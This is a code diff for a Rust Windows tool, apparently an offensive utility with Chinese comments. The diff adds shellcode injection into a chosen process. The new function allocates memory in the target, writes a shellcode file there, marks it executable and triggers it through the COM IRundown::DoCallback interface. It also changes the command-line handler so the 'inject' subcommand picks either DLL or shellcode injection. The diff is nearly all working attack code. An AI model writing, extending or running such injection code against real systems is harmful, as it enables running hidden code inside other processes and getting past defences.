@@ -10,7 +10,7 @@ use windows::{
                 CoInitializeEx, CoUninitialize, IStream, COINIT_MULTITHREADED, MSHCTX_INPROC,
                 STREAM_SEEK_SET, StringFromIID, CoGetObject, Marshal::CoUnmarshalInterface,
             },
-            LibraryLoader::{GetModuleHandleW, GetProcAddress}, Diagnostics::{Debug::{ReadProcessMemory, WriteProcessMemory}, ToolHelp::{PROCESSENTRY32, CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, Process32First, Process32Next}}, Threading::{OpenProcess, PROCESS_VM_READ, PROCESS_QUERY_LIMITED_INFORMATION, GetCurrentProcessId, OpenThread, THREAD_QUERY_INFORMATION, NtQueryInformationThread, THREADINFOCLASS, PROCESS_VM_WRITE, PROCESS_VM_OPERATION}, Registry::{RegGetValueA, HKEY_CLASSES_ROOT, RRF_RT_REG_SZ, RegGetValueW}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
+            LibraryLoader::{GetModuleHandleW, GetProcAddress}, Diagnostics::{Debug::{ReadProcessMemory, WriteProcessMemory}, ToolHelp::{PROCESSENTRY32, CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, Process32First, Process32Next}}, Threading::{OpenProcess, PROCESS_VM_READ, PROCESS_QUERY_LIMITED_INFORMATION, GetCurrentProcessId, OpenThread, THREAD_QUERY_INFORMATION, NtQueryInformationThread, THREADINFOCLASS, PROCESS_VM_WRITE, PROCESS_VM_OPERATION}, Registry::{RegGetValueA, HKEY_CLASSES_ROOT, RRF_RT_REG_SZ, RegGetValueW}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS},
         },
         UI::Shell::SHCreateMemStream, Foundation::{HANDLE, CloseHandle},
     }, core::{PCSTR, PWSTR, PCWSTR}, s,
@@ -834,6 +834,7 @@ unsafe fn inject_dll(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<(
         if pLoadLibraryW.is_null() {
             return Err(::anyhow::Error::msg("GetProcAddress failed"));
         }
+        
         println!("pfnCallback:\t{:p}(LoadLibraryW)", pLoadLibraryW);
         println!("pParam:\t{:p}", m);
         
@@ -852,6 +853,44 @@ unsafe fn inject_dll(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<(
     ret
 }
 
+unsafe fn inject_shellcode(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<()> {
+    // 打开目标进程
+    let hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, (*cc).pid)?;
+
+    let start_inject = move || -> Result<()> {
+        // 读取 shellcode 内容
+        if !std::path::PathBuf::from((*cc).path.clone()).exists() {
+            return Err(::anyhow::Error::msg("Shellcode file is not exsited"));
+        }
+        let sc = std::fs::read((*cc).path.clone())?;
+        // 写入 DLL 路径到目标内存
+        let pShellcode = VirtualAllocEx(hp, None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if pShellcode.is_null() {
+            return Err(::anyhow::Error::msg("VirtualAllocEx failed"));
+        }
+        WriteProcessMemory(hp, pShellcode, sc.as_ptr() as *const _, sc.len(), None).ok()?;
+        let mut oldprotect: PAGE_PROTECTION_FLAGS = zeroed();
+        VirtualProtectEx(hp, pShellcode, sc.len(), PAGE_EXECUTE_READ, &mut oldprotect).ok()?;
+        
+        let m: *mut c_void = null_mut();
+        println!("pfnCallback:\t{:p}(shellcode)", pShellcode);
+        println!("pParam:\t{:p}", m);
+        
+        // 调用 IRundown::DoCallback 加载 DLL
+        (*rc).pfnCallback = pShellcode;
+        (*rc).pParam = m;
+        invoke_docallback(cc, rc).with_context(|| "Invoke IRundown::DoCallback failed")?;
+
+        println!("Shellcode inject successfully!!");
+        Ok(())
+    };
+
+    // 执行完毕关闭进程句柄
+    let ret = start_inject();
+    CloseHandle(hp);
+    ret
+}
+
 fn main() -> Result<()> {
     // 解析参数
     let matches = cli().get_matches();
@@ -860,34 +899,35 @@ fn main() -> Result<()> {
         Some(("inject", sub_matches)) => {
             cc.pid = *sub_matches.get_one::<u32>("pid").expect("required");
             cc.use_objref = *sub_matches.get_one::<bool>("method") .expect("required");
-            if sub_matches.contains_id("dll") {
-                cc.inject_dll = true;
-                cc.path = sub_matches.get_one::<String>("dll").expect("required").clone();
 
-                unsafe {
-                    // 初始化 COM
-                    CoInitializeEx(None, COINIT_MULTITHREADED).unwrap();
+            unsafe {
+                // 初始化 COM
+                CoInitializeEx(None, COINIT_MULTITHREADED).unwrap();
 
-                    let mut start_inject = move || -> Result<()> {
-                        // 初始化 COM_CONTEXT
-                        init_cc(&mut cc).with_context(|| "Init COM_CONTEXT failed")?;
-                        // 初始化 RUNDOWN_CONTEXT
-                        let mut rc: RUNDOWN_CONTEXT = zeroed();
-                        init_rundown_ctx(&mut cc, &mut rc).with_context(|| "Init RUNDOWN_CONTEXT failed")?;
+                let mut start_inject = move || -> Result<()> {
+                    // 初始化 COM_CONTEXT
+                    init_cc(&mut cc).with_context(|| "Init COM_CONTEXT failed")?;
+                    // 初始化 RUNDOWN_CONTEXT
+                    let mut rc: RUNDOWN_CONTEXT = zeroed();
+                    init_rundown_ctx(&mut cc, &mut rc).with_context(|| "Init RUNDOWN_CONTEXT failed")?;
+                    if sub_matches.contains_id("dll") {
+                        cc.inject_dll = true;
+                        cc.path = sub_matches.get_one::<String>("dll").expect("required").clone();
                         // 调用 IRundown::DoCallback 完成 DLL 注入
                         inject_dll(&mut cc, &mut rc).with_context(|| "注入失败")?;
-                        Ok(())
-                    };
+                    } else {
+                        cc.inject_pic = true;
+                        cc.path = sub_matches.get_one::<String>("shellcode").expect("required").clone();
+                        // 调用 IRundown::DoCallback 完成 shellcode 注入
+                        inject_shellcode(&mut cc, &mut rc).with_context(|| "注入失败")?;
+                    }
+                    Ok(())
+                };
 
-                    // 执行结束后清理
-                    let ret = start_inject();
-                    CoUninitialize();
-                    ret
-                }
-            } else {
-                cc.inject_pic = true;
-                cc.path = sub_matches.get_one::<String>("shellcode").expect("required").clone();
-                Ok(())
+                // 执行结束后清理
+                let ret = start_inject();
+                CoUninitialize();
+                ret
             }
         }
         _ => unreachable!()
